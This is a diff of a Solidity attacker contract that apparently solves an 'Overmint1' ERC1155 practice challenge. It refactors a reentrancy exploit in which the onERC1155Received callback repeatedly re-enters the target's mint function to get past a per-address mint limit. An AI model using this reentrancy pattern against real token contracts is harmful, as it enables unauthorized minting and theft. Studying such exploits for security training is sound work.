@@ -1,7 +1,6 @@
 // SPDX-License-Identifier: MIT
 pragma solidity =0.8.19;
 
-// import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";
 
 interface IERC1155Mintable{
 
@@ -19,31 +18,29 @@ interface IERC1155Mintable{
 
 contract Overmint1_ERC1155Attacker  {
 
-// contract Overmint1_ERC1155Attacker is IERC1155Receiver {
-
     IERC1155Mintable erc1155;
     address attacker;
-    uint256 id;
+    // uint256 id;
 
     constructor(
-        address _erc1155,
-        uint256 _id
+        address _erc1155
+        // uint256 _id
         ) {
         erc1155 = IERC1155Mintable(_erc1155);
-        id = _id;
+        // id = _id;
     }
 
-    function attack() external {
+    function attack(uint256 _id) external {
         attacker = msg.sender;
-        erc1155.mint(id, new bytes(0));
+        erc1155.mint(_id, new bytes(0));
     }
 
     function onERC1155Received(
-        address operator,
-        address from,
+        address ,
+        address ,
         uint256 id,
-        uint256 value,
-        bytes calldata data
+        uint256 ,
+        bytes calldata 
     ) external returns (bytes4) {
 
         if(erc1155.balanceOf(attacker,id ) < 5) {
@@ -57,15 +54,5 @@ contract Overmint1_ERC1155Attacker  {
         return this.onERC1155Received.selector;
 
     }
-
-    // function onERC1155BatchReceived(
-    //     address operator,
-    //     address from,
-    //     uint256[] calldata ids,
-    //     uint256[] calldata values,
-    //     bytes calldata data
-    // ) external override returns (bytes4){
-
-    // }
 
 }
